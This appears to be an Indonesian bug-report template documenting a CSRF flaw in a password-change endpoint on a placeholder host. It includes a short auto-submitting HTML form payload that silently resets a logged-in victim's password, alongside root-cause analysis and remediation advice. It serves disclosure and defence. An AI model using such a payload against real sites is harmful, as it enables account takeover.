---
title: 🐞 Bug Report – Cross-Site Request Forgery (CSRF)
updated: 2025-12-17 03:58:44Z
created: 2025-12-17 03:58:41Z
latitude: -6.20239360
longitude: 106.65270990
altitude: 0.0000
---

# 🐞 Bug Report – Cross-Site Request Forgery (CSRF)

## 1\. Informasi Umum

- **Judul**: CSRF pada Fitur Perubahan Password
    
- **Severity**: **High**
    
- **Kategori**: Web Application – Authentication / Access Control
    
- **OWASP Mapping**: A01 – Broken Access Control
    
- **Status**: Open
    
- **Tanggal Temuan**: \[isi tanggal\]
    
- **Tester**: \[Nama Anda\]
    

* * *

## 2\. Deskripsi Kerentanan

Aplikasi web ditemukan **rentan terhadap serangan Cross-Site Request Forgery (CSRF)** pada fitur perubahan password.  
Endpoint tersebut **tidak menggunakan CSRF token** dan tidak melakukan validasi origin atau referer, sehingga memungkinkan penyerang **memaksa browser korban yang sedang login** untuk mengirim request berbahaya tanpa sepengetahuan korban.

* * *

## 3\. Dampak (Impact)

Jika kerentanan ini dieksploitasi, penyerang dapat:

- Mengubah password akun korban
    
- Mengambil alih akun (**Account Takeover**)
    
- Mengubah data sensitif pengguna
    
- Melakukan aksi atas nama korban
    

**Tingkat risiko: Tinggi**, karena serangan dapat dilakukan hanya dengan membuat korban mengunjungi halaman berbahaya.

* * *

## 4\. Target Affected

- **URL**:
    
    `https://target.com/change_password`
    
- **Method**: POST
    
- **Fungsi**: Perubahan password pengguna
    
- **Autentikasi**: Diperlukan (session cookie)
    

* * *

## 5\. Bukti Kerentanan (Proof of Concept)

### 5.1 Request Asli Aplikasi

`POST /change_password HTTP/1.1Host: target.comCookie: PHPSESSID=abc123Content-Type: application/x-www-form-urlencodednew_password=123456`

📌 **Catatan**: Tidak terdapat CSRF token dalam request.

* * *

### 5.2 Payload CSRF (Exploit)

`<html> <body> <form action="https://target.com/change_password" method="POST"> <input type="hidden" name="new_password" value="hacked123"> </form> <script> document.forms[0].submit(); </script> </body></html>`

* * *

### 5.3 Langkah Eksploitasi

1.  Korban login ke aplikasi target
    
2.  Session login masih aktif
    
3.  Korban membuka halaman HTML berbahaya di atas
    
4.  Browser otomatis mengirim request ke target
    
5.  Password korban berubah tanpa konfirmasi
    

* * *

## 6\. Expected vs Actual Result

| Expected Result | Actual Result |
| --- | --- |
| Request ditolak tanpa CSRF token | Request berhasil diproses |
| Validasi token dilakukan | Tidak ada validasi |
| Aksi sensitif butuh konfirmasi | Aksi langsung dieksekusi |

* * *

## 7\. Root Cause Analysis

- Tidak adanya **CSRF token**
    
- Tidak diterapkannya **SameSite cookie**
    
- Tidak ada validasi **Origin / Referer**
    
- Endpoint sensitif dapat diakses tanpa proteksi tambahan
    

* * *

## 8\. Rekomendasi Perbaikan

Disarankan untuk:

1.  **Implementasi CSRF Token**
    
    - Token unik per session & request
2.  Aktifkan **SameSite Cookie**
    
    `Set-Cookie: PHPSESSID=abc123; SameSite=Strict`
    
3.  Gunakan **POST** untuk aksi sensitif
    
4.  Validasi **Origin / Referer Header**
    
5.  Manfaatkan proteksi bawaan framework (Laravel, Django, Spring)
    

* * *

## 9\. Referensi

- OWASP CSRF: https://owasp.org/www-community/attacks/csrf
    
- OWASP Top 10 2021 – A01 Broken Access Control
    

* * *

## 10\. Kesimpulan

Kerentanan CSRF pada fitur perubahan password memungkinkan penyerang melakukan aksi sensitif atas nama korban tanpa autentikasi ulang. Kerentanan ini memiliki **dampak tinggi** dan harus segera diperbaiki untuk mencegah pengambilalihan akun.